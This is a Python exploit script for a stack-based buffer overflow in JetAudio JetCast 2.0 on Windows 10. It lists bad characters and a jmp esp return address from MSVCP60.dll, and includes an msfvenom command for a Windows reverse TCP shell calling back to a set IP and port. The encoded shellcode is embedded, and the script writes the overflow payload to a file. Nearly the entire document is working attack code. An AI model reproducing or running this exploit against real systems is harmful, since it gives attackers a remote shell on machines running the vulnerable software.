
"""
Exploit developed on Operating System: Windows 10
Vulnerable application: JetAudio JetCast 2.0
Exploit type: Stack based Buffer Overflow
"""

# Bad characters = \x00\x0a\x0d\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8e\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9e\x9f

"""
Address=77EF9D55
Message=  0x77ef9d55 : jmp esp |  {PAGE_EXECUTE_READ} [MSVCP60.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v6.00.8168.0 (C:\Program Files (x86)\JetCast Server\MSVCP60.dll)
"""

# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.6 LPORT=2345 -a x86 -b "\x00\x0a\x0d\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8e\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9e\x9f" EXITFUNC=thread -f py -v shellcode

total = 5000
count = 532

eip = b"\x55\x9d\xef\x77"

shellcode =  b"\x90" * 10
shellcode += b"\x54\x59\xda\xdd\xd9\x71\xf4\x5a\x4a\x4a\x4a"
shellcode += b"\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43"
shellcode += b"\x43\x43\x43\x37\x52\x59\x6a\x41\x58\x50\x30"
shellcode += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
shellcode += b"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
shellcode += b"\x42\x75\x4a\x49\x4b\x4c\x5a\x48\x6f\x72\x77"
shellcode += b"\x70\x75\x50\x75\x50\x51\x70\x4f\x79\x6b\x55"
shellcode += b"\x50\x31\x6f\x30\x65\x34\x6e\x6b\x70\x50\x50"
shellcode += b"\x30\x4c\x4b\x30\x52\x46\x6c\x6c\x4b\x76\x32"
shellcode += b"\x44\x54\x6c\x4b\x53\x42\x64\x68\x64\x4f\x6c"
shellcode += b"\x77\x43\x7a\x44\x66\x64\x71\x6b\x4f\x6c\x6c"
shellcode += b"\x75\x6c\x33\x51\x71\x6c\x47\x72\x46\x4c\x47"
shellcode += b"\x50\x4a\x61\x68\x4f\x44\x4d\x56\x61\x79\x57"
shellcode += b"\x79\x72\x7a\x52\x56\x32\x62\x77\x4c\x4b\x76"
shellcode += b"\x32\x46\x70\x4c\x4b\x32\x6a\x47\x4c\x6c\x4b"
shellcode += b"\x30\x4c\x44\x51\x63\x48\x59\x73\x51\x58\x73"
shellcode += b"\x31\x6b\x61\x62\x71\x4e\x6b\x70\x59\x65\x70"
shellcode += b"\x43\x31\x5a\x73\x4c\x4b\x70\x49\x75\x48\x59"
shellcode += b"\x73\x46\x5a\x77\x39\x4c\x4b\x55\x64\x4c\x4b"
shellcode += b"\x35\x51\x4a\x76\x36\x51\x79\x6f\x6c\x6c\x5a"
shellcode += b"\x61\x7a\x6f\x64\x4d\x67\x71\x69\x57\x66\x58"
shellcode += b"\x6b\x50\x54\x35\x4a\x56\x64\x43\x61\x6d\x59"
shellcode += b"\x68\x75\x6b\x73\x4d\x36\x44\x71\x65\x39\x74"
shellcode += b"\x30\x58\x4c\x4b\x51\x48\x75\x74\x53\x31\x69"
shellcode += b"\x43\x61\x76\x6c\x4b\x36\x6c\x62\x6b\x6e\x6b"
shellcode += b"\x56\x38\x67\x6c\x56\x61\x6b\x63\x4c\x4b\x57"
shellcode += b"\x74\x4e\x6b\x55\x51\x68\x50\x6e\x69\x77\x34"
shellcode += b"\x55\x74\x66\x44\x71\x4b\x33\x6b\x70\x61\x53"
shellcode += b"\x69\x33\x6a\x53\x61\x79\x6f\x4d\x30\x43\x6f"
shellcode += b"\x43\x6f\x70\x5a\x4c\x4b\x57\x62\x7a\x4b\x4e"
shellcode += b"\x6d\x43\x6d\x35\x38\x70\x33\x34\x72\x45\x50"
shellcode += b"\x65\x50\x75\x38\x42\x57\x71\x63\x50\x32\x73"
shellcode += b"\x6f\x56\x34\x63\x58\x50\x4c\x51\x67\x65\x76"
shellcode += b"\x66\x67\x59\x6f\x49\x45\x38\x38\x4e\x70\x57"
shellcode += b"\x71\x53\x30\x57\x70\x76\x49\x6b\x74\x31\x44"
shellcode += b"\x62\x70\x61\x78\x56\x49\x4f\x70\x52\x4b\x63"
shellcode += b"\x30\x49\x6f\x5a\x75\x36\x30\x50\x50\x32\x70"
shellcode += b"\x42\x70\x43\x70\x66\x30\x67\x30\x32\x70\x33"
shellcode += b"\x58\x58\x6a\x76\x6f\x49\x4f\x4d\x30\x6b\x4f"
shellcode += b"\x4e\x35\x6f\x67\x61\x7a\x43\x35\x75\x38\x66"
shellcode += b"\x6a\x63\x30\x65\x52\x56\x66\x71\x78\x63\x32"
shellcode += b"\x75\x50\x56\x69\x34\x69\x4c\x49\x38\x66\x51"
shellcode += b"\x7a\x72\x30\x42\x76\x71\x47\x51\x78\x6f\x69"
shellcode += b"\x6e\x45\x61\x64\x43\x51\x4b\x4f\x6a\x75\x4b"
shellcode += b"\x35\x6f\x30\x72\x54\x54\x4c\x69\x6f\x42\x6e"
shellcode += b"\x54\x48\x43\x45\x58\x6c\x61\x78\x38\x70\x48"
shellcode += b"\x35\x69\x32\x73\x66\x39\x6f\x7a\x75\x35\x38"
shellcode += b"\x71\x73\x70\x6d\x35\x34\x77\x70\x4f\x79\x68"
shellcode += b"\x63\x33\x67\x51\x47\x66\x37\x46\x51\x38\x76"
shellcode += b"\x62\x4a\x72\x32\x61\x49\x53\x66\x78\x62\x49"
shellcode += b"\x6d\x71\x76\x79\x57\x62\x64\x75\x74\x55\x6c"
shellcode += b"\x65\x51\x53\x31\x6e\x6d\x62\x64\x46\x44\x36"
shellcode += b"\x70\x5a\x66\x73\x30\x72\x64\x56\x34\x76\x30"
shellcode += b"\x61\x46\x61\x46\x61\x46\x77\x36\x72\x76\x32"
shellcode += b"\x6e\x50\x56\x56\x36\x61\x43\x42\x76\x30\x68"
shellcode += b"\x50\x79\x78\x4c\x47\x4f\x6c\x46\x4b\x4f\x69"
shellcode += b"\x45\x4e\x69\x59\x70\x52\x6e\x52\x76\x62\x66"
shellcode += b"\x49\x6f\x46\x50\x30\x68\x46\x68\x4b\x37\x67"
shellcode += b"\x6d\x33\x50\x79\x6f\x38\x55\x4d\x6b\x4d\x30"
shellcode += b"\x47\x6d\x67\x5a\x57\x7a\x61\x78\x4f\x56\x6c"
shellcode += b"\x55\x4d\x6d\x4d\x4d\x79\x6f\x6a\x75\x77\x4c"
shellcode += b"\x55\x56\x33\x4c\x64\x4a\x6d\x50\x79\x6b\x6d"
shellcode += b"\x30\x72\x55\x63\x35\x4f\x4b\x52\x67\x77\x63"
shellcode += b"\x42\x52\x50\x6f\x70\x6a\x65\x50\x51\x43\x79"
shellcode += b"\x6f\x48\x55\x41\x41"

pattern = b"A" * count + eip + shellcode + b"C" * (total-count-4-len(shellcode))

with open("string", "wb") as f:
	f.write(pattern)

